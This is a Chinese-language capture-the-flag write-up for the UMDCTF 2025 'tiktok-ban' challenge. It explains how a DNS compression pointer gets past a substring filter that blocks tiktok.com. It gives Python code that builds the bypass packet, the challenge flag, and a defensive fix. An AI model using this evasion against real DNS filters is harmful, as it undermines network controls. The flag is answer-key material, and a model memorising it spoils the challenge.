# UMDCTF 2025 - tiktok-ban

## 题目简述

服务读取一个带四字节长度前缀的 DNS 报文。若原始请求中出现字节串
`tiktok\x03com`，请求会被拦截；否则报文被原样转发给本地 `dnsmasq`。
`dnsmasq` 为 `tiktok.com` 配置了一条包含 flag 的 TXT 记录。

本题的核心是 DNS 报文编码差异，不属于现有方向中某个更精确的类别，因此放入
`_unclassified`，而不是仅因使用了网络服务就归为 Web。

## 解题过程

过滤器只在原始字节流中搜索域名的连续标签表示：

```python
if b'tiktok\x03com' in req:
    print("blocked")
else:
    sock.sendto(req, ("127.0.0.1", 25565))
```

DNS 名称不只有连续标签这一种写法。[RFC 1035](https://www.rfc-editor.org/rfc/rfc1035)
规定，名称可以用最高两位为 `11` 的双字节压缩指针引用报文中另一处的名称；
余下 14 位是从 DNS 报文开头计算的偏移。因而可让问题区写入 `tiktok` 标签，
再用指针引用报文末尾的 `com` 标签：

```python
import struct

header = struct.pack(
    "!HHHHHH",
    0x0001, 0x0100,
    1, 0, 0, 0,
)

question = struct.pack(
    "!7s2sHH",
    b"\x06tiktok",
    b"\xc0\x19",
    16,  # TXT
    1,   # IN
)

suffix = b"\x03com\x00"
dns_packet = header + question + suffix
payload = len(dns_packet).to_bytes(4, "big") + dns_packet
```

这里 DNS 报文头长 12 字节，问题部分长 13 字节，所以附加的 `com` 从偏移
`12 + 13 = 25 = 0x19` 开始。问题中的名称实际为：

```text
\x06tiktok + \xc0\x19
```

原始字节中没有连续的 `tiktok\x03com`，过滤器因此放行；`dnsmasq` 解压指针后
却把它解释成 `tiktok.com`。查询类型为 16，即 TXT，于是响应中包含：

```text
UMDCTF{W31C0M3_84CK_4ND_7H4NK5_F0r_Y0Ur_P4713NC3_4ND_5UPP0r7_45_4_r35U17_0F_Pr351D3N7_7rUMP_71K70K_15_84CK_1N_7H3_U5}
```

## 方法总结

漏洞来自“过滤器按原始表示检查、后端按协议语义解析”的不一致。DNS 压缩指针让
同一域名拥有不同的线缆表示，简单子串匹配无法覆盖。可靠方案应使用完整 DNS
解析器规范化问题名称，再对解析后的域名和查询类型实施策略，并拒绝畸形或多余数据。
